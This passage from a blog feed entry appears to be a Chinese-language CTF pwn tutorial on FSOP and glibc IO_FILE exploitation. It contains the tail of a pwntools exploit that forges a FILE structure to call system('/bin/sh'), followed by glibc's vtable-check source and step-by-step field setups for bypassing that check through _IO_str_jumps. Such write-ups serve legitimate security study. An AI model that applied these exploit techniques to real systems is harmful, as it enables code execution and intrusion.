class="line"><span class="built_in">print</span> (<span class="string">&quot;_IO_list_all: &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> +<span class="number">0xe0</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="2-24后新机制下利用"><a href="#2-24后新机制下利用" class="headerlink" title="2.24后新机制下利用"></a>2.24后新机制下利用</h1><h2 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h2><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在<strong>调用虚函数之前</strong>首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable - <strong>start_</strong>libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 vtable 是非法的，那么会引发 abort。</p><p><u>在加入这个限制后,对vtable的利用几乎难以实现</u></p><p><u>故将视线转向IO_FILE本身</u></p><p>当然这些利用在之前的版本亦有效</p><hr><p>不过这个检查其实并不是非常严格</p><p>如果只是在vtable所在段内进行劫持并不一定会触发错误</p><h3 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h3><p>_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p><p>因为三个标准流的存在</p><p>无需文件操作,直接利用scanf\printf便可以进行利用。</p><p>其中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p><h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h2><p>libc.so中还存在其他的无检查的vtable如_IO_str_jumps和_IO_wstr_jumps,其中前者的绕过更为简单</p><p>以前者为例,源码位于bits/strops.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。</p><p><strong>出现的结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> *(*_IO_alloc_type) (_IO_size_t);</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_IO_free_type)</span> <span class="params">(<span class="type">void</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is needed for the Irix6 N32 ABI, which has a 64 bit off_t type,</span></span><br><span class="line"><span class="comment">   but a 32 bit pointer type.  In this case, we get 4 bytes of padding</span></span><br><span class="line"><span class="comment">   after the vtable pointer.  Putting them in a structure together solves</span></span><br><span class="line"><span class="comment">   this problem.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 由上一句能看出一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//call qword ptr [fp+0xe0] 参数是new_size</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_blen(fp)宏</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><h3 id="0x1-1"><a href="#0x1-1" class="headerlink" title="0x1"></a>0x1</h3><p>利用的是其中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>要满足的条件</p><ol><li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</li><li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</li><li>fp+0xe0指向system地址</li></ol><p>绕过</p><ol><li>fp-&gt;<em>flags = 0</em></li><li>_fp-&gt;_IO_buf_base = 0</li><li>fp-&gt;<em>IO_buf_end = (bin_sh_addr - 100) / 2</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li><li>vtable = _IO_str_jumps - 0x18</li></ol><p>或者</p><ol><li>_flags = 0 </li><li>_IO_write_base = 0 </li><li>_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 </li><li>_IO_buf_end = (binsh_in_libc_addr -100) / 2  </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_jumps - 0x18</li></ol><h3 id="0x2-1"><a href="#0x2-1" class="headerlink" title="0x2"></a>0x2</h3><p>注意到满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br></pre></td></tr></table></figure><p>的时候，会先后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size_t old_blen = _IO_blen (fp);</span><br><span class="line">// #define _IO_blen (fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br><span class="line">new_buf = malloc (new_size);</span><br><span class="line">memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">free (old_buf);</span><br></pre></td></tr></table></figure><p>三个操作，伪造 _IO_FILE 并劫持 vtable 为 _IO_str_jumps 通过一个 large bin attack 就可以轻松实现，并且上面三个语句中的 new_size，old_buf 和 old_blen 是我们可控的，这个函数就可以实现以下三步</p><ol><li>调用 malloc，实现从 tcache 中分配 chunk，在这里就可以把我们之前放入的 __free_hook fake chunk 申请出来</li><li>将一段可控长度可控内容的内存段拷贝置 malloc 得来的 chunk 中（可以修改 __free_hook 为 system）</li><li>调用 free，且参数为内存段起始地址（”/bin/sh\x00”，getshell）</li></ol><p>只要构造得当，执行该函数即可 getshell。</p><h2 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//call qword ptr [fp+0E8h]参数为fp-&gt;_IO_buf_base</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件：</p><ol><li>_IO_buf_base 不为空</li><li>_flags &amp; _IO_USER_BUF(0x01) 为假</li></ol><p>构造如下：</p><ol><li>_flags = (binsh_in_libc + 0x10) &amp; ~1 </li><li>_IO_buf_base = binsh_addr </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_finish - 0x18 </li><li>fp+0xe8 -&gt; system_addr</li></ol><p>或者</p><ol><li>fp-&gt;<em>flags = 0</em></li><li><em>vtable = _IO_str_jumps - 0x8//这样调用_IO_overflow时会调用到 _IO_str_finish</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li></ol>]]></content>
    
    
    <summary type="html">FSOP</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="IO_FILE" scheme="https://ixout.github.io/tags/IO-FILE/"/>
    
    <category term="FSOP" scheme="https://ixout.github.io/tags/FSOP/"/>
    
  </entry>
  
</feed>
